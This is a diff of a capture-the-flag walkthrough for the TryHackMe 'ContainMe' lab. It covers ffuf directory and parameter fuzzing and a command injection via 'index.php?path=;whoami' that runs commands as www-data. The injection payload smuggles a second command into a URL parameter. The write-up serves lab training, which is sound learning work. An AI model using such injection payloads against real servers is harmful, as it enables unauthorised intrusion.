@@ -1,5 +1,5 @@
-# ContainMe - THM -Walkthrough
-<img width="90" height="89" alt="1_urU3DCALxSjKakNfdRlyGQ" src="https://github.com/user-attachments/assets/c9bc61b9-fea8-4efe-b9ad-c393bd913c37" />
+# ContainMe - THM -Walkthrough <img width="90" height="89" alt="1_urU3DCALxSjKakNfdRlyGQ" src="https://github.com/user-attachments/assets/c9bc61b9-fea8-4efe-b9ad-c393bd913c37" />
+
 
 ## Enumeration
 We will start with Nmap scan to see what open ports and what services are running on the target machine.
@@ -40,11 +40,31 @@ It's a default Apache page. So, I try to fuzz it using FFUF tool to find a hidde
 ```
 ffuf -u http://<target-ip>/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.txt,.html
 
-RESULTS
-
+RESULTS THAT WE CARE ABOUT
+index.php
+info.php
 ```
+If we visit the info.php we will find the PHP Version 7.2.24 which is vulnerable to RCE. The index.php is more interesting and it contains a list of files in a folder on the Server.
+<img width="525" height="195" alt="image" src="https://github.com/user-attachments/assets/491a69a8-d8fa-4ea1-9b52-d25f4bd35163" />
+
+I give a try and test some wordkeys like cmd of just a ? after the .php extention but with no luck. So I try again with FFUF but this time a little bit different.
+```
+ffuf -u http://<target-ip>/index.php?FUZZ=whoami -w /usr/share/wordlists/burp_parameter_names.txt -fs 329
+
+OUTPUT
+path 
+```
+We have a parameter that we can use, but it will not work just like that. It take me a while but i figure the it need a semicolom (;) before the command. So the full URL with the whoami command must be
+```
+http://<target-ip>/index.php?path=;whoami
+
+OUTPUT
+www-data
+```
+<img width="619" height="200" alt="image" src="https://github.com/user-attachments/assets/3c7eeb1e-dff6-4808-9df4-cad27d404e44" />
 
 ## Shell
+Here is the idea for a python script that it will help a little. It's the **command_injection.py** script. With this script i can navigate to the directories and files that the www-data user has access. With this way i found the user mike under the home directory.
 
 ## Root Access
 
